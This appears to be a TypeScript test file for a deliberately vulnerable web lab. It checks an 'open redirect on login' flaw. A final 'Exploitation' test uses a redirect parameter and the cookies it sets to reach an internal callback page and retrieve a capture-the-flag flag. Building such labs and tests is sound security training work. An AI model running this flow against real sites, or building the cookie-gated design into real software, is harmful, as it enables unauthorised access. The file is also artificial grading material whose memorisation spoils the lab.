import {
  apiRequest,
  TEST_USERS,
  extractAuthTokenFromHeaders,
  loginOrFail,
  BASE_URL,
} from "../helpers/api";
import { FLAGS } from "../helpers/flags";

describe("Open Redirect on Login", () => {
  const { email, password } = TEST_USERS.alice;

  describe("Login without redirect", () => {
    it("returns 200 and does not set oauth_callback cookie", async () => {
      const { status, headers } = await apiRequest("/api/auth/login", {
        method: "POST",
        body: JSON.stringify({ email, password }),
      });

      expect(status).toBe(200);
      const setCookie = headers.get("set-cookie") || "";
      expect(setCookie).not.toContain("oauth_callback");
    });
  });

  describe("Login with redirect", () => {
    it("returns 200 and sets oauth_callback cookie", async () => {
      const { status, headers } = await apiRequest("/api/auth/login", {
        method: "POST",
        body: JSON.stringify({
          email,
          password,
          redirect: "/internal/oauth/callback",
        }),
      });

      expect(status).toBe(200);
      const setCookie = headers.get("set-cookie") || "";
      expect(setCookie).toContain("oauth_callback=1");
    });
  });

  describe("Internal callback page access control", () => {
    it("redirects when only authToken is present", async () => {
      const authToken = await loginOrFail(email, password);

      const { status } = await apiRequest("/internal/oauth/callback", {
        headers: { Cookie: `authToken=${authToken}` },
        redirect: "manual",
      });

      expect(status).toBeGreaterThanOrEqual(300);
      expect(status).toBeLessThan(400);
    });

    it("redirects when only oauth_callback is present", async () => {
      const { status } = await apiRequest("/internal/oauth/callback", {
        headers: { Cookie: "oauth_callback=1" },
        redirect: "manual",
      });

      expect(status).toBeGreaterThanOrEqual(300);
      expect(status).toBeLessThan(400);
    });

    it("redirects when no cookies are present", async () => {
      const { status } = await apiRequest("/internal/oauth/callback", {
        redirect: "manual",
      });

      expect(status).toBeGreaterThanOrEqual(300);
      expect(status).toBeLessThan(400);
    });
  });

  describe("Exploitation: full open redirect flow", () => {
    it("retrieves the flag via login with redirect and callback page", async () => {
      const loginRes = await fetch(`${BASE_URL}/api/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email,
          password,
          redirect: "/internal/oauth/callback",
        }),
      });

      expect(loginRes.status).toBe(200);

      const setCookie = loginRes.headers.get("set-cookie") || "";
      const authTokenMatch = setCookie.match(/authToken=([^;]+)/);
      expect(authTokenMatch).toBeTruthy();
      const authToken = authTokenMatch![1];
      expect(setCookie).toContain("oauth_callback=1");

      const callbackRes = await fetch(`${BASE_URL}/internal/oauth/callback`, {
        headers: {
          Cookie: `authToken=${authToken}; oauth_callback=1`,
        },
        redirect: "follow",
      });

      expect(callbackRes.status).toBe(200);
      const html = await callbackRes.text();
      expect(html).toContain(FLAGS.OPEN_REDIRECT);
    });
  });
});
